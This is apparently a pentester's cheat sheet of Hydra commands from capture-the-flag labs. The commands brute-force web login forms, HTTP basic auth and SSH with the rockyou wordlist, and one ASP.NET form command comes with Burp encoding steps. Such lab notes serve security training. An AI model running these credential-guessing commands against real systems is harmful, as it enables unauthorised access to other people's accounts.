- - -
### HYDRA : 🐲️ 🐉️ 🀄️ 🐉️ 

```sh
hydra -l username -P password_list IP_ADDR -V http-post-form '/path login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -t 25 
```

```sh
hydra -l noob -P /usr/share/wordlists/rockyou.txt -V 10.10.222.48 -s 8000 http-post-form '/login:username=^USER^&password=^PASS^:Incorrect username / password !' 
```

```sh
hydra -l bob -P /opt/rockyou.txt  -f  10.10.231.52  http-get  /protected/  
```

```sh
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111 -I 
```

```sh
hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>
```

```sh
hydra -l meliodas -P /opt/rockyou.txt ssh://10.10.89.136 
```


- - -
##### HTTP-Post-Form ( Step By Step )

- Capture the request in burp. send to reapeter.
- Select the post data then send to decoder and decode with URL option. 
- Now open meyerweb and encode every data one by one. ( Dont't do double encode ) 

```sh
hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.23.48 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=qN0IByUIbUyK4RM7yM/+uuUXYaWdaU6Hed7NQyrTm2I48Vwdn1ZQ1x6pZMJfd6lxoDAMtkudA6aOGPZjpqEbSQY6wWQ4u8YSIhmC52K+oXtFpZ2HDbi1Odsntjs+nyfOQVfUjGP1xBWN9iJ2pYH7oAdAM/4DyM4/MojDAFMiQUb0JqO43cYWNG1FOnRO3yxwibNsNpA2yqI61MEnNQC6TmoUDqUd0kpek86BCYTu8mTkYIT9GTYZwSp41y7tFZbUea33/AqpcUvP1GqtNA8P3kjYZ+XH6EUxaPjZPiE641UQ0Kebn6IAB//UhzFIBtNDB+ixNCHnQ4yA/RZC3Fs7OmsbeRQmJWKL8OMk1WxG6t5BRFgb&__EVENTVALIDATION=nCK09WZRBH9Wpl6yLGmGe98QNQ3yzHjr5VL08e7kXJOlkaA0GtyvMmiSV3GhyMghl+0CdtWyzNdmW3yrR6GHAad6NTHmGi8pWNFxaj8FTsDtnumDp2dm3yKYmY1mDceKCkWlyLa2sH0lR33k58wymAiRlpLW0bUbpSg7ZYy7nrlor+0h&ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Login failed'
```

